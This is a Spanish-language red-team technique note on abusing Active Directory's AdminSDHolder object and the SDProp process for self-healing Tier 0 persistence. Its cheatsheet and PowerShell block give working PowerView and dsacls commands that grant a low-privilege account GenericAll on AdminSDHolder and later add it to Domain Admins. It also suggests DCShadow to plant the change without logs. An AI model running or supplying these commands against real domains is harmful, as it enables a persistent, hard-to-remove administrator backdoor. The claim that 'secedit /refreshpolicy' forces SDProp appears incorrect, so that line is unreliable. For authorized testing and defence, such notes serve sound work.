---
aliases:
  - AdminSDHolder Abuse
  - AdminSDHolder
  - SDProp Backdoor
tags:
  - technique/persistence
  - technique/privilege-escalation
  - asset/active-directory
  - env/windows
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Active Directory]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: Technique
linked:
  - "[[ACL Abuse]]"
  - "[[AD - ACL Enumeration]]"
  - "[[DCShadow]]"
---
# AdminSDHolder Abuse

`AdminSDHolder` es un objeto especial en `CN=System` cuyo DACL es la **plantilla de permisos** para todas las cuentas protegidas (Domain Admins, Enterprise Admins, etc.). Un proceso del DC llamado **SDProp** copia ese DACL a todos los objetos protegidos **cada 60 minutos**, sobrescribiendo cualquier cambio.

El backdoor: como DA, **agregás tu cuenta con `GenericAll` al DACL de AdminSDHolder**. SDProp propaga ese permiso a todos los grupos/usuarios Tier 0 → tu cuenta low-priv obtiene control total sobre los admins, y **se restaura solo cada hora** aunque el defensor lo borre.

---

## Cheatsheet

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' -ResolveGUIDs` | DACL actual de AdminSDHolder (auditar backdoors) | Recon / detección. |
| `Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' -PrincipalIdentity lowpriv -Rights All` | Da `GenericAll` a `lowpriv` sobre AdminSDHolder | Plantar el backdoor (requiere DA). |
| `Set-ADObject` / `dsacls "CN=AdminSDHolder,CN=System,..." /G corp\lowpriv:GA` | Igual con RSAT/dsacls | Alternativa. |
| `Get-ADGroupMember 'Domain Admins'` + esperar ~60 min | SDProp ya propagó el permiso a los DAs | Verificar propagación. |
| `Add-DomainGroupMember -Identity 'Domain Admins' -Members lowpriv` | Usar el `GenericAll` propagado → auto-agregarte a DA | Re-escalada cuando quieras. |

```powershell
# Plantar (como DA) — PowerView
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' `
  -PrincipalIdentity lowpriv -Rights All
# Forzar SDProp ya (sin esperar 60 min) — desde el DC
Invoke-Command -ComputerName dc01 { secedit /refreshpolicy machine_policy }
# Más tarde, abusar el permiso propagado a Domain Admins
Add-DomainGroupMember -Identity 'Domain Admins' -Members lowpriv
```

---

## Overview

Es persistencia **Tier 0 self-healing**: el permiso vive en una plantilla que el propio DC re-aplica cada hora. Aunque el defensor saque a `lowpriv` de Domain Admins o limpie las ACLs de los admins, **SDProp lo vuelve a poner** mientras el DACL de AdminSDHolder siga modificado.

La limpieza real requiere encontrar y revertir el cambio en **AdminSDHolder** mismo (no en los objetos protegidos) → fácil de pasar por alto.

> [!tip] Frecuencia de SDProp
> Default 60 min (`AdminSDProtectFrequency` en el registro del DC). El permiso se propaga a cualquier objeto con `adminCount=1`.

> [!warning] Requiere DA
> Plantar el backdoor necesita write sobre AdminSDHolder (= DA). El abuso posterior lo hace la cuenta low-priv. Combinable con [[DCShadow]] para plantarlo sin logs.

---

## Recursos

- [adsecurity.org — AdminSDHolder / SDProp](https://adsecurity.org/?p=1906) — Sean Metcalf.
- [The Hacker Recipes — AdminSDHolder](https://www.thehacker.recipes/ad/persistence/adminsdholder) — comandos.
